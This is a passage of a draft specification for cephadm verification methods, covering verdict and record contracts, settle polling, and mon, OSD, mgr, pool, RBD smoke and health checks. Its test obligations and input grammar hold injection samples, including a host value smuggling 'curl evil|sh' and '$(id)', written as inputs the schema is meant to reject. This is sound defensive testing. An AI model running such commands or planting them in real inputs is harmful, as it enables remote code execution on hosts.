# 05: Verification, placement pre-checks and capacity report

Status: draft for review · Part of the `@randybias/cephadm` behaviour
specification. Read `00-overview.md` first. Its decisions D1–D60 override this
file wherever the two disagree.

Methods specified here (registry #18–#32):

| # | Method | Class | Error phase tag |
|---|---|---|---|
| 18 | cephVerifyMonQuorum | RO | `mon-quorum` |
| 19 | cephVerifyOsd | RO | `osd` |
| 20 | cephVerifyHealth | RO | `health` |
| 21 | cephVerifyHostNoout | RO | `host-noout` |
| 22 | cephVerifyPool | RO | `pool` |
| 23 | cephVerifyRbdSmoke | W | `rbd-smoke` |
| 24 | cephVerifyHostPrep | RO | `host-prep` |
| 25 | cephVerifyDisksRaw | RO | `disks-raw` |
| 26 | cephVerifyMgr | RO | `mgr` |
| 27 | cephVerifyCsiUsers | RO | `csi-users` |
| 28 | cephVerifyKeyDistributed | RO | `key-distributed` |
| 29 | cephVerifyMonPlacement | RO | `mon-placement` |
| 30 | cephVerifyMgrPlacement | RO | `mgr-placement` |
| 31 | cephVerifyOsdClaimable | RO | `osd-claimable` |
| 32 | cephCapacityReport | RO | `capacity` |

`cephVerifyClusterFsid` (#41) is a read-only check with its own contract. It is
specified in `06-maintenance-teardown.md`, not here.

---

## 1. Cross-cutting rules for this group

### 1.1 Role

These methods are the gates that an unattended workflow relies on. Each one
MUST detect a bad cluster state loudly and precisely, and MUST NOT smooth it
over. Every Ceph read MUST use structured JSON output (`ceph <subcommand> -f
json`). Human-readable output such as `ceph -s` text MUST NOT be parsed.

- **Why:** text layout changes between Ceph releases, and a parser that drifts
  silently turns a gate into a rubber stamp.

No expected value is ever hard-wired. Mon count, OSD up/in counts, pool size,
failure domain, package list and every other expectation are arguments. The
only defaults are `throwOnFail = true` and, for the CRUSH rule in
`cephVerifyOsd`, the rule with `rule_id` 0.

### 1.2 The verify-result contract

This contract applies to methods #18–#31. `cephCapacityReport` (#32) is a
report, not a verdict, and follows §9 instead.

**Verdict.** Every method produces exactly one verdict:

| Field | Type | Meaning |
|---|---|---|
| `pass` | boolean | The verdict |
| `expected` | JSON value | What the caller asserted. The shape is per method |
| `actual` | JSON value or `null` | What was observed. MUST be `null` when nothing was observed. A made-up value is never allowed |
| `detail` | object | Extra evidence: failing check names, available pools, reasons, and so on |
| `subject` | string, optional | The pool, filesystem, entity or host name the check is about (D41) |

**Composite verdicts.** `cephVerifyOsd`, `cephVerifyPool` and
`cephVerifyDisksRaw` combine sub-checks into one verdict:
- the combined `pass` is the logical AND of the sub-checks;
- `expected`, `actual` and `detail` are objects keyed by sub-check name;
- each slot holds the sub-check's own expected, actual or detail value
  directly, not a nested verdict;
- a sub-check that was not requested counts as passing, and its slots are
  left out.

**Persist, then throw (D40).** The method MUST follow this order:
1. Compute the verdict.
2. Write the record (§1.3), whether the verdict passed or failed.
3. If `pass` is false and `throwOnFail` is true, throw.

- **Why:** a halted workflow needs the structured evidence as well as the error
  text. Throwing first would lose the only machine-readable record of the
  failure.

**`throwOnFail`.** A boolean, nullish, default `true`, on every method #18–#31.
- When it is `true` and the verdict fails, the method throws after writing the
  record.
- When it is `false`, the failing verdict is returned and recorded, and the
  caller decides. Typically a workflow asserts on `pass`.
- A passing verdict is never thrown.

**Failing-verdict error message.** It MUST have this shape:
- the prefix `cephadm[<phase>]:`, using the phase tag in the table above;
- `expected=<json>` and `actual=<json>`;
- every detail field, JSON-encoded;
- the record key, so the caller can find the stored evidence.

A halted run's error text alone MUST say *why* it failed, with the observed
numbers and names, and not just "verification failed". No secret may appear in
it.

**Unconditional faults.** Some failures are configuration or safety faults, not
verdicts about the cluster. These throw **whatever** `throwOnFail` says, and
they write no verify record, because no verdict exists:
- schema or runtime argument validation failure;
- a typed transport error (D8) that never yielded a readable answer;
- output that should be JSON but is not (the error includes a short excerpt of
  stdout and stderr);
- a disk serial that resolves to zero devices or to several (§5.2);
- in `cephVerifyRbdSmoke`, a name collision, or a create or info command that
  fails (§3.2).

### 1.3 The verify record

All of methods #18–#31 share one resource, `cephVerifyResult`.

- Lifetime is `infinite`, and it keeps the last 10 versions.
- The schema is strict and declares every field that is written (D41):

| Field | Type | Notes |
|---|---|---|
| `method` | string | The method name |
| `host` | string | The admin host. For `cephVerifyKeyDistributed`, it is the joined host list (below) |
| `subject` | string, optional | Declared in the schema (D41). Written by `cephVerifyPool` and `cephVerifyHostNoout` |
| `pass` | boolean | |
| `expected` | JSON value | |
| `actual` | JSON value or `null` | |
| `detail` | object | |
| `capturedAt` | string | ISO-8601 time from the injected clock |

**Key forms.** A key is stable and can be built by a caller. It is never
timestamped. There are exactly three forms:

| Form | Used by |
|---|---|
| `<method>-<host>` | every method without a subject |
| `<method>-<host>-<subject>` | `cephVerifyPool` (subject = `poolName`), `cephVerifyHostNoout` (subject = `hostName`) |
| `<method>-<host:port,…>` | `cephVerifyKeyDistributed`: each target as `host:port`, sorted, then joined with commas |

- **Why:** a key built only from method and host collides deterministically.
  A workflow that verifies two pools through one admin host would overwrite the
  first pool's evidence in the same run, and the surviving half would look
  complete. Any method whose subject can vary per call MUST put the subject in
  the key.

Each method returns exactly one data handle.

### 1.4 Common inputs

Every method takes the shared SSH argument family (00-overview §3): `host`,
`sshUser` (D1), `port`, `keyPath` (D2), `privateKey` (sensitive), and
`strictHostKeyChecking` (`yes` | `no`, where absent means `yes`).
`cephVerifyKeyDistributed` takes `hosts[]` in place of `host`. Methods #18–#31
also take:

| Argument | Type | Default | Rule |
|---|---|---|---|
| `throwOnFail` | boolean, nullish | `true` | See §1.2 |

Every optional argument is nullish, and null means the same as absent.

Shared grammars that this file uses but does not define:
- the **hostname** grammar (01-transport): for `host`, `hosts[]`, `hostName`,
  `placement[]` and `targetHost`;
- the **device-serial** grammar (01-transport);
- the **identifier-reference** grammar: 1–128 characters of letters, digits,
  `.`, `_` and `-`. A leading `.` is allowed, because these names refer to
  existing objects such as the built-in pool `.mgr`. The stricter grammar for
  names that get created is in 04-dataplane.
  - Accepted: `.mgr`, `rbd`, `cephfs.fs1.data`.
  - Rejected: `rbd;ls`, `a b`, `$(id)`, the empty string.

### 1.5 Execution

- Ceph and `rbd` commands run inside `cephadm shell` on the admin host. They go
  through the script-file mechanism and minimum budget in 01-transport (D7,
  D37), never as a nested-quoted command line.
- Plain host reads go over SSH directly: `grep`, `dpkg`, `lsblk`, `systemctl`,
  `test` and `cephadm version`.
- Every interpolated value has already passed a strict grammar, and it is also
  single-quoted for the shell.
- `ceph` calls use `-f json`. `rbd` MUST use `--format json`, because `rbd`
  rejects `-f json` with "too many arguments".
  - **Why:** the short flag is right for `ceph` and wrong for `rbd`. Assuming
    it carries across tools fails only when the check first runs.
- A command's own non-zero exit is not a transport error. An SSH exit of 255, a
  connection failure or a timeout is a typed transport error (D8).
- Status strings are compared case-insensitively (D44). This covers health
  status, MDS state, host status and PG state tokens.

### 1.6 Settle polling (cephVerifyMonQuorum, cephVerifyOsd, cephVerifyPool)

These three methods take an optional settle budget in ms and a poll-interval
ceiling in ms.

**Budget.**
- An omitted, null or zero budget means **single-shot**: exactly one read and
  no sleep. This is the default.
- With a positive budget, the method re-reads until the verdict passes or the
  budget runs out.
- It returns as soon as a read passes, so a generous budget costs nothing on a
  healthy cluster.
- There is always at least one read.

**Timeout.** On timeout, the method returns the **last observed** verdict,
never a made-up one, so the failure message names what was actually seen.

**What is retried (D47).**
- A failing verdict is read again.
- A typed transport error is retried.
- Any other exception ends the poll at once and propagates. Examples are
  output that is not JSON, or a non-zero exit from a command that does not
  tolerate one.
- If no read ever produced an answer, the last transport error is rethrown. The
  method never invents a verdict about the cluster.
- **Why:** the cluster can be unreachable for short windows, such as a
  container restart or a mon election. A malformed answer, by contrast, will
  not improve by waiting.

**Wait between reads.** This is the capped exponential backoff with jitter
defined in 01-transport. The interval argument is the **ceiling**, default
10,000 ms. As a reminder:
- the first base interval is max(1, ceil(ceiling / 16)), and it doubles up to
  the ceiling;
- jitter puts each sleep uniformly in [raw/2, raw], rounded, with a minimum of
  1 ms;
- each sleep is clamped to the remaining budget.

The sleep function, the jitter generator and the clock are injected dependencies.

**Why polling exists.** `ceph orch apply mon/osd` and pool creation are
declarative and asynchronous. A single read straight after them measures the
state *before* the effect, and reports a race as a fault.
- Size the budget to the physical event. OSD creation takes minutes, and PG
  peering on a new pool over new OSDs can take minutes to hours.
- A pool read seconds after creation can show every PG
  `active+undersized+remapped` while size and min_size are already correct.
- A settle window is a window, not an amnesty. A state that never settles
  still fails.

### 1.7 Host-subtree noout predicate (shared)

The predicate below decides whether a host-subtree `noout` flag is set for a
given Ceph host name. `cephVerifyHostNoout` uses it, and the maintenance proofs
in 06-maintenance-teardown MUST use the same predicate, so the two cannot drift
apart (D46). **[twin]**

1. Read `ceph health detail -f json`.
2. Take `checks.OSD_FLAGS`. If it is absent, the flag counts as **not set**.
3. Collect candidate statements from **both** `summary.message` and every
   `detail[].message`.
4. A statement asserts the flag for host H when it has the form `host <H> has
   flags <list>`, where:
   - `<H>` equals the requested host name **as a whole token**;
   - `<list>` is a comma-separated flag list, treated as an **unordered set**;
   - `noout` is a member of that set (flag tokens compared case-insensitively).
5. The flag is set if any statement asserts it.

Examples, for host name `host-a`:

| Statement | Result |
|---|---|
| `host host-a has flags noout` | set |
| `host host-a has flags noin,noout` | set |
| `host host-a has flags noout,noin` | set |
| `host host-a1 has flags noout` | not set |
| `host host-a has flags noin` | not set |
| `osd.3 has flags noout` | not set (not a host flag) |

The cluster-wide flags in `ceph osd dump` MUST NOT be consulted.
- **Why:** a subtree noout is not a cluster flag and never appears in the
  `ceph osd dump` flags line. Looking there gives a confident wrong "not set",
  which before a disruption reads as "host unprotected, proceed", and after it
  reads as "nothing left behind". Both are the dangerous direction.

### 1.8 Description leads

- Every method in this file except `cephVerifyRbdSmoke` is read-only, and its
  description MUST start with `READ-ONLY.`
- The placement checks (#29–#31) SHOULD go on to say they are pre-approval
  checks that apply nothing.
- `cephVerifyRbdSmoke`'s description MUST NOT start with `READ-ONLY.` Its first
  sentence MUST say that it creates and removes one throwaway RBD image, and
  that it is the only verify method that writes anything.
- `cephCapacityReport`'s description MUST define `atRiskPools` exactly as in
  D35: erasure-coded pools whose min_size margin is ≤ 1.

### 1.9 Group-wide test obligations

- [ ] Run a sweep over every method in this file: `strictHostKeyChecking`
      accepts `yes`, `no`, absent and null, and rejects `accept-new`. A newly
      added method without the field fails the sweep.
- [ ] With `strictHostKeyChecking: "no"`, every SSH invocation carries
      `StrictHostKeyChecking=no`.
- [ ] A `host` containing shell metacharacters (`x; curl evil|sh`) → rejected
      by every method's schema before anything runs.
- [ ] A passing verdict → returned, recorded, not thrown.
- [ ] A failing verdict with `throwOnFail` true → a record is written **first**,
      then a throw whose message contains `cephadm[<phase>]:`, `actual=`, the
      offending value and the record key (D40).
- [ ] A failing verdict with `throwOnFail` false → returned with `pass: false`,
      recorded, not thrown.
- [ ] The `cephVerifyResult` schema declares `subject`. A record carrying
      `subject` validates under the strict schema (D41).
- [ ] Key forms: a pool record keys as `cephVerifyPool-<host>-<pool>`. Two pools
      verified via one host produce two distinct records. The key-distribution
      key is sorted `host:port` pairs, and is identical whatever the input order.
- [ ] An unconditional fault (for example, output that is not JSON) throws
      even with `throwOnFail: false`, and writes no verify record.
- [ ] Settle: a transport error is retried, but output that is not JSON stops
      the poll at once (D47).

---

## 2. Cluster-membership checks

### 2.1 cephVerifyMonQuorum

- **Safety class:** RO.
- **Purpose:** Assert that the monmap has exactly the expected number of mons
  **and** that every defined mon is in quorum. A mon can be defined and still
  be out of quorum.
- **Inputs:**

| Argument | Type | Required | Default | Rule |
|---|---|---|---|---|
| common (§1.4) | | | | |
| `expectedMonCount` | integer | yes | | ≥ 1 |
| `quorumSettleMs` | integer, nullish | no | 0 (single-shot) | ≥ 0 |
| `quorumPollIntervalMs` | integer, nullish | no | 10000 | ≥ 1. Backoff ceiling; ignored without a budget |

- **Preconditions:** a reachable admin host with cephadm.
- **Behaviour:**
  1. Inside the settle poll (§1.6), read `ceph quorum_status -f json`.
  2. Mon names come from `monmap.mons[].name`. Quorum names come from
     `quorum_names`.
  3. outOfQuorum = monmap names that are not in `quorum_names`.
  4. pass = (monmap mon count = `expectedMonCount`) AND (outOfQuorum is empty).
- **Idempotency:** a pure read; it can be repeated.
- **Output / record:**
  - Key `cephVerifyMonQuorum-<host>`.
  - expected `{monCount, allInQuorum: true}`.
  - actual `{monCount, quorumCount, outOfQuorum[]}`.
  - detail `{monNames, quorumNames}`. It SHOULD also include a `settle` block
    like the one in §3.1.
- **Post-verification:** none. This method is itself the proof.
- **Failure modes:**
  - a count mismatch → failing verdict;
  - any out-of-quorum mon → failing verdict that names it;
  - a transport error with no answer → unconditional throw.
- **Security:** no caller value reaches the command.
- **Why:** a new mon joins asynchronously after `ceph orch apply mon`. Set a
  settle budget when this check follows one.
- **Test obligations:**
  - [ ] 3 of 3 in quorum, expected 3 → pass; actual `{3, 3, []}`.
  - [ ] One mon defined but out of quorum → fail, naming it.
  - [ ] Count mismatch → fail.
  - [ ] The method issues `ceph quorum_status -f json` and writes a passing
        record.
  - [ ] Failing with `throwOnFail` → the record is written, then the error names
        the out-of-quorum mon (D40).

### 2.2 cephVerifyOsd

- **Safety class:** RO.
- **Purpose:** Assert the OSD up count and the OSD in count against independent
  expectations, **and** that a CRUSH rule's failure domain matches.
- **Inputs:**

| Argument | Type | Required | Default | Rule |
|---|---|---|---|---|
| common (§1.4) | | | | |
| `expectedUp` | integer | yes | | ≥ 0 |
| `expectedIn` | integer | yes | | ≥ 0 |
| `expectedFailureDomain` | string | yes | | identifier-reference grammar, non-empty |
| `crushRuleName` | string, nullish | no | the rule with `rule_id` 0 | identifier-reference grammar |
| `osdSettleMs` | integer, nullish | no | 0 | ≥ 0 |
| `osdPollIntervalMs` | integer, nullish | no | 10000 | ≥ 1 |

- **Preconditions:** a reachable admin host.
- **Behaviour:** every polled read runs **both** `ceph osd stat -f json` and
  `ceph osd crush rule dump -f json`.
  - **`osd` sub-check:** pass when `num_up_osds` = `expectedUp` AND
    `num_in_osds` = `expectedIn`. Detail includes `num_osds`.
  - **`crush` sub-check:**
    - Select the rule by `rule_name`, or by `rule_id` 0 when no name is given.
    - If the rule is not found → fail, actual `null`, with a reason and the list
      of available rule names.
    - Otherwise the failure domain is the `type` of the first step whose `op`
      starts with `choose` (this covers `chooseleaf_*`) and which has a `type`.
    - pass when that domain equals `expectedFailureDomain`. Detail holds the
      rule name and id.
  - The combined verdict (§1.2) passes only when both sub-checks pass.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyOsd-<host>`.
  - Composite slots `osd` and `crush`.
  - detail SHOULD include a `settle` block (§3.1).
- **Post-verification:** none.
- **Failure modes:**
  - a count mismatch → failing verdict;
  - a wrong failure domain → failing verdict;
  - a missing rule → failing verdict;
  - a transport error with no answer → unconditional throw.
- **Security:** `crushRuleName` is only compared locally and never reaches a
  command.
- **Why:**
  - Up and in are separate on purpose. During host maintenance, OSDs stop (up
    drops) but stay in (that is what noout buys), so no rebalance starts. One
    combined count would hide that gap.
  - Both reads happen on every poll, because the CRUSH rule for something new
    can appear later than the OSDs. Polling only one half would keep failing on
    the other.
- **Test obligations:**
  - [ ] up = in = expected → pass.
  - [ ] up ≠ in → fail.
  - [ ] up = in but ≠ expected → fail.
  - [ ] Default rule (`rule_id` 0) domain matches → pass.
  - [ ] Wrong domain → fail, naming both the expected and the actual domain.
  - [ ] Named rule missing → fail, with the list of available rules.
  - [ ] Wrong CRUSH domain fails even when up and in match.
  - [ ] The method issues `osd stat` and `crush rule dump`. With up below
        expected and `throwOnFail` → the error contains the observed count.
  - [ ] Settle, with ceiling 5000 and jitter pinned at the top: the sequence
        (12/18 up, then 18/18) passes after exactly four ceph calls and exactly
        one sleep of 313 ms.
  - [ ] Without a budget, the same sequence fails single-shot after exactly two
        ceph calls, and the error contains `12`.

### 2.3 cephVerifyMgr

- **Safety class:** RO.
- **Purpose:** Assert the mgr daemon count **and** that one mgr is genuinely
  active, not merely that N are defined. `cephApplyMgr` only converges the
  declared placement, and it never looks at daemon state.
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `expectedCount` | integer | yes | ≥ 1 |

- **Behaviour:**
  1. Read `ceph mgr dump -f json`.
  2. active = `active_name` is a non-empty string.
  3. total = (1 if active, else 0) + the length of `standbys`.
  4. pass = active AND total = `expectedCount`.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyMgr-<host>`.
  - expected `{total, active: true}`.
  - actual `{total, active, activeName | null, standbyCount}`.
  - detail `{standbyNames}`.
- **Failure modes:**
  - no active mgr → failing verdict;
  - a count mismatch → failing verdict.
- **Security:** no caller value reaches the command.
- **Why:** standbys alone can add up to the expected count while nothing is
  serving.
- **Test obligations:**
  - [ ] Active mgr plus a matching number of standbys → pass.
  - [ ] No active mgr → fail, even when the standby count alone equals the
        expected count.
  - [ ] Count mismatch → fail, naming the actual total.
  - [ ] The method issues `mgr dump` and writes a record.
  - [ ] No active mgr with `throwOnFail` → the error names the actual count.

### 2.4 cephVerifyCsiUsers

- **Safety class:** RO. It handles output that contains keys, and discards the
  keys.
- **Purpose:** Assert that every expected `client.<name>` entity exists, and
  report its caps.
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `expectedUserNames` | string[] | yes | non-empty. Each entry uses the identifier-reference grammar and is a bare name; the method adds `client.` |

- **Behaviour:**
  1. Read `ceph auth ls -f json`. The entity list is wrapped as `{auth_dump:
     [...]}` (see the JSON shapes in 04-dataplane).
  2. Take only `entity` and `caps` from each entry. Discard `key` at once.
  3. pass = every `client.<name>` is present.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyCsiUsers-<host>`.
  - expected = the list of prefixed entity names.
  - actual = the names found.
  - detail `{missing, users: [{entity, caps}]}`.
- **Failure modes:** any missing entity → failing verdict that names it.
- **Security:**
  - Key material MUST NOT reach the result, the record, the logs or an error
    message.
  - `cephFetchCsiKey` (04-dataplane) is the only method that reads a key.
- **Test obligations:**
  - [ ] All present → pass.
  - [ ] Missing names are listed in `detail.missing`.
  - [ ] The input carries `key` fields, and serializing the whole result and
        the record finds no key string.
  - [ ] A missing entity is named in the thrown error.
  - [ ] A user name with an injection attempt → rejected by the schema.

---

## 3. Data-path checks

### 3.1 cephVerifyPool

- **Safety class:** RO.
- **Purpose:** Assert that a pool exists at the expected size with every PG
  `active+clean`. Optionally it also asserts min_size, the erasure-code shape,
  and MDS state.
- **Inputs:**

| Argument | Type | Required | Default | Rule |
|---|---|---|---|---|
| common (§1.4) | | | | |
| `poolName` | string | yes | | identifier-reference grammar (`.mgr` accepted) |
| `expectedSize` | integer | yes | | ≥ 1. Replica count, or k+m |
| `expectedMinSize` | integer, nullish | no | not asserted | ≥ 1 |
| `expectedErasureProfile` | `{k, m, failureDomain}`, nullish | no | not asserted | k ≥ 1, m ≥ 1, `failureDomain` non-empty identifier |
| `mds` | `{fsName, expectedActive, expectedStandby}`, nullish | no | skipped | `fsName` identifier-reference; both counts ≥ 0 |
| `settleMs` | integer, nullish | no | 0 | ≥ 0 |
| `settlePollIntervalMs` | integer, nullish | no | 10000 | ≥ 1 |

Explicit `null` MUST mean exactly "not asserted" for each optional assertion,
and MUST NOT weaken any other assertion.
- **Why:** workflow loops over mixed pool specs reach these fields through
  conditional expressions, which can only express "nothing" as null. A schema
  that is optional but not nullable would reject the call before any ceph
  command runs, and fail replicated or non-CephFS rows for reasons unrelated to
  the cluster.

- **Preconditions:** a reachable admin host.
- **Behaviour.** One polled read (§1.6) runs these steps:
  1. **`pool`.** Read `ceph osd pool ls detail -f json` and find the entry whose
     `pool_name` equals `poolName`.
     - If it is missing → fail, actual `null`, with a reason and the list of
       available pools.
     - Size passes when `size` = `expectedSize`.
     - min_size passes, when asserted, if `min_size` = `expectedMinSize`.
     - The observed `min_size` is **always** reported. Detail says whether it
       was asserted. When it was not, detail notes that it was observed but not
       certified.
  2. **Gate on step 1.** Steps 3–5 run only if step 1 passed: the pool is
     present and size and min_size are correct. Otherwise each step left out is
     listed in `detail.skipped` as `{check, reason}` (D43). The reason is one
     of `pool absent`, `size mismatch` or `min_size mismatch`.
     - **Why:** `pg ls-by-pool` on a missing pool is itself an error, and
       reading the PGs of a wrong-sized pool certifies nothing. The skip must
       still be visible, so that a missing PG verdict is not mistaken for a
       passing one.
  3. **`pgs`.** Read `ceph pg ls-by-pool '<poolName>' -f json` and take
     `pg_stats`.
     - An empty list → fail ("no PGs").
     - Split each PG's `state` on `+`. A PG is clean when the tokens include
       both `active` and `clean`.
     - actual reads `"<N>/<M> active+clean"`. Detail lists the PGs that are not
       clean as `{pgid, state}`.
  4. **`ec`.**
     - **When `expectedErasureProfile` is given:**
       - Take the pool's `erasure_code_profile`. If it is empty or missing →
         fail ("not erasure-coded").
       - Otherwise read `ceph osd erasure-code-profile get '<profile>' -f
         json`. If the profile cannot be read → fail, with "absence is not a
         pass" in detail.
       - Ceph returns every value as a string. Parse `k` and `m` as integers,
         and compare `crush-failure-domain` literally.
       - A value that is not an integer stays visible in actual as the raw
         string. It never becomes a numeric placeholder.
       - The full profile goes in detail.
     - **When no profile is given:** a passing, unasserted sub-result reports the
       profile name (or null), with `asserted: false` and a note.
  5. **`mds`** (only when `mds` is given).
     - Read `ceph fs status '<fsName>' -f json` and take `mdsmap[]`.
     - active = the count with state `active`. standby = the count with state
       `standby`.
     - pass = (active = `expectedActive`) AND (standby ≥ `expectedStandby`).
  6. **Combine** the `pool`, `pgs`, `ec` and `mds` slots (§1.2).
- **Settle detail:** after polling, detail gains `settle {settleMs, attempts,
  elapsedMs, firstReadPassed, observedTransition}`. `observedTransition` is
  true only when there was more than one attempt, the first read failed and the
  final read passed. A pass on the first read is not a transition.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyPool-<host>-<poolName>`.
  - `subject` = `poolName`.
  - Composite slots `pool`, `pgs`, `ec` and `mds`.
  - `detail.skipped` (D43) and `detail.settle`.
- **Failure modes:** each sub-check failure above → failing verdict; a
  transport error with no answer → unconditional throw.
- **Security:** `poolName`, `fsName` and the profile name read from the cluster
  are grammar-checked and single-quoted before they are interpolated.
- **Why:**
  - min_size is the durability margin. An EC 3+2 pool over exactly five hosts is
    size 5 / min_size 4, so one host down leaves zero margin. A check on size
    alone cannot tell 5/4 from a quietly weakened 5/3.
  - Read the EC shape from the profile **contents**, never from the profile
    name. A profile with the right name can hold anything.
  - The failure domain is part of the shape. k3/m2 at `osd` and at `host` have
    identical size and min_size, but the `osd` variant survives no host loss.
  - An empty profile is also how a replicated pool quietly swapped in under the
    same name shows up.
- **Test obligations:**
  - [ ] Pool present at size → pass. Pool absent → fail, actual null, with the
        available pools listed.
  - [ ] Size mismatch → fail, and `detail.skipped` lists pgs/ec/mds with reason
        `size mismatch` (D43).
  - [ ] min_size asserted and matching → pass. 5/3 against an expected 4 → fail,
        and `skipped` names `min_size mismatch` (D43).
  - [ ] min_size not asserted → it is still reported, `asserted: false`, and the
        note is present.
  - [ ] All PGs clean → pass. One PG `peering` → fail, naming it. An empty
        `pg_stats` → fail.
  - [ ] MDS with exactly the expected active count and standby ≥ expected →
        pass. Active mismatch → fail. 0 standby against an expected 1 → fail.
        No `mds` requested, or `mds: null` → that slot passes.
  - [ ] Combined: size ok but PGs dirty → fail. PGs ok but MDS failing → fail.
  - [ ] EC:
    - [ ] profile 3/2/host → pass, with the string values `"3"` and `"2"`
          parsed;
    - [ ] the same k/m at `osd` → fail;
    - [ ] a wider profile → fail;
    - [ ] no profile on the pool → fail;
    - [ ] an unreadable profile → fail, with "absence is not a pass";
    - [ ] `k: "three"` → fail, with `actual.ec.k` equal to `"three"`;
    - [ ] an EC-only failure fails the combined verdict, with `actual.ec`
          holding the sub-actual directly;
    - [ ] no EC assertion → the combined verdict stays green.
  - [ ] Null handling: a null `expectedMinSize` behaves like an omitted one, and
        the note is present. Null does not mask a size mismatch. The schema
        accepts null for `expectedMinSize`, `expectedErasureProfile` and `mds`.
  - [ ] Method level:
    - [ ] healthy size, PGs and MDS → passing record with `subject`;
    - [ ] a missing pool → after exactly **one** ceph call, a record, then an
          error naming the pool;
    - [ ] a dirty PG → an error naming the state;
    - [ ] `throwOnFail: false` → a failing record and no throw.
  - [ ] Settle:
    - [ ] (dirty, dirty, clean) with a budget → pass, attempts 3,
          `firstReadPassed: false`, `observedTransition: true`;
    - [ ] clean at once → attempts 1, `firstReadPassed: true`, transition false;
    - [ ] never clean with a 1 ms budget → throws;
    - [ ] no budget → single-shot (exactly two ceph calls) and throws.
  - [ ] Schema: an injection attempt in `poolName` or `mds.fsName` → rejected.
        `.mgr` → accepted.

### 3.2 cephVerifyRbdSmoke

- **Safety class:** W. The verdict is read-only, but the method writes one
  throwaway object and removes it. It is the **only** writer among the verify
  methods.
- **Purpose:** An end-to-end functional RBD check: create a tiny, uniquely named
  throwaway image, read it back, and remove it.
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `pool` | string | yes | identifier-reference grammar. It is interpolated into `<pool>/<image>`, so an injection attempt is rejected |

- **Preconditions:** the pool exists and has the `rbd` application enabled.
- **Behaviour:**
  1. **Name.** The image name is `cephadm-smoke-` followed by a random UUID from
     the injected randomness dependency (D39). The prefix is fixed, so a leaked
     image can be identified unambiguously.
  2. **Collision probe.** Run `rbd info '<pool>/<image>' --format json`,
     allowing a non-zero exit.
     - If it exits 0, the name already exists. **Refuse** and throw
       unconditionally, and never create.
     - A typed transport error also throws, and nothing is created.
  3. **Create.** Run `rbd create --size 1M '<pool>/<image>'`.
  4. **Read back.** Run `rbd info '<pool>/<image>' --format json`.
     - If the output is not JSON, throw with an excerpt of stdout.
     - Otherwise infoMatches = (`name` = the generated name) AND (`size` =
       1048576 bytes) (D39).
  5. **Clean up.** This step ALWAYS runs once step 3 has been attempted, even
     when step 3 or step 4 failed. Run `rbd rm '<pool>/<image>'`, allowing a
     non-zero exit.
     - A transport failure during cleanup is captured, not thrown, so it never
       masks the primary error.
  6. **Errors.** If create or info failed, rethrow after cleanup. This is an
     unconditional fault (§1.2).
  7. **Verdict.** When create succeeded and info parsed:
     - pass = infoMatches AND (cleanup exited 0);
     - expected `{created: true, infoMatches: true, cleanedUp: true}`;
     - actual `{created: true, infoMatches, cleanedUp}`;
     - detail `{pool, imageName, info, cleanupStderr?}`.

     `throwOnFail` governs only this verdict.
- **Idempotency:** each run uses a fresh name. A successful run leaves no
  lasting change.
- **Output / record:** key `cephVerifyRbdSmoke-<host>`.
- **Post-verification:** the cleanup exit code is part of the verdict. When
  cleanup fails, the error and the record name the image, so that an operator
  can remove it.
- **Failure modes:**
  - collision → unconditional throw ("already exists");
  - create or info failure → cleanup attempted, then rethrow;
  - name or size mismatch → failing verdict;
  - cleanup failure → failing verdict.
- **Security:** only the grammar-checked pool name and the generated name are
  interpolated, and both are quoted.
- **Why:**
  - Touching a pre-existing image is never acceptable. That is the reason for
    the probe-before-create, and for refusing unconditionally.
  - Checking the name and size proves that the read-back saw *this* image. A
    parse alone would prove only that some JSON came back.
- **Test obligations:**
  - [ ] Happy path → exactly four cephadm-shell calls: probe (not found),
        create, info, rm. A passing record is written. The create script
        contains `rbd create --size 1M <pool>/cephadm-smoke-` (D39).
  - [ ] Every `rbd` invocation uses `--format json`, never `-f json`.
  - [ ] Collision (the probe exits 0) → throws "already exists", and no create
        script is ever written.
  - [ ] Create fails → rm is still attempted, and the error is rethrown.
  - [ ] Info fails after create → rm is still attempted, and the error is
        rethrown.
  - [ ] Info reports a different name, or a size other than 1048576 → failing
        verdict, rm attempted (D39).
  - [ ] Cleanup fails after create and info, with `throwOnFail: false` → a
        record with `pass: false`, and no throw.
  - [ ] Cleanup fails with `throwOnFail: true` → the record is written first,
        then the throw names the image (D40).
  - [ ] An injection attempt in `pool` → rejected by the schema.

---

## 4. Health and flags

### 4.1 cephVerifyHealth

- **Safety class:** RO.
- **Purpose:** Assert cluster health in a stated direction, and name the
  specific health checks responsible.
- **Inputs:**

| Argument | Type | Required | Default | Rule |
|---|---|---|---|---|
| common (§1.4) | | | | |
| `wantOk` | boolean | yes | **none, on purpose** | `true` asserts healthy; `false` asserts not healthy |
| `allowedWarnings` | string[], nullish | no | empty | health check **names**, which are keys of the `checks` map: upper-case letters, digits and `_`, 1–64 characters. Accepted: `OSD_FLAGS`. Rejected: `osd flags`, `OSD;X` |

- **Preconditions:** a reachable admin host.
- **Behaviour:**
  1. Read `ceph health detail -f json` once. There is no settle option.
  2. Evaluate the rules below in order. The first rule that matches decides.
     Each refusal gives `actual: null`, `expected: wantOk`, and a reason in
     detail.
     1. **Missing status.** `status` is missing, not a string, or empty →
        fail, whatever `wantOk` is (D38).
     2. **Unknown status.** `status` is not one of `HEALTH_OK`, `HEALTH_WARN`
        or `HEALTH_ERR` (compared case-insensitively, D44) → fail, whatever
        `wantOk` is. The raw status goes in detail (D38).
     3. **Warning with no named check.** `HEALTH_WARN` with `checks` absent or
        empty → fail, whatever `wantOk` is, and even with an allowlist. The
        status goes in detail (D38).
     4. **Contradiction.** `wantOk: false` together with a non-empty
        `allowedWarnings` → fail for every status, with a reason that names
        `wantOk`. Detail echoes `status` and `allowedWarnings`, which are the
        two things the caller must change (D38).
     5. **Otherwise**, healthy = `HEALTH_OK`, or `HEALTH_WARN` where every
        active check name is in `allowedWarnings`. `HEALTH_ERR` is never
        healthy, even when every check is on the allowlist. pass = (healthy =
        `wantOk`).
  3. Detail for an evaluated verdict holds:
     - `status`;
     - `activeChecks` (names);
     - `unallowedChecks`;
     - a map from each check name to its `summary.message`.
- **Contract summary:**
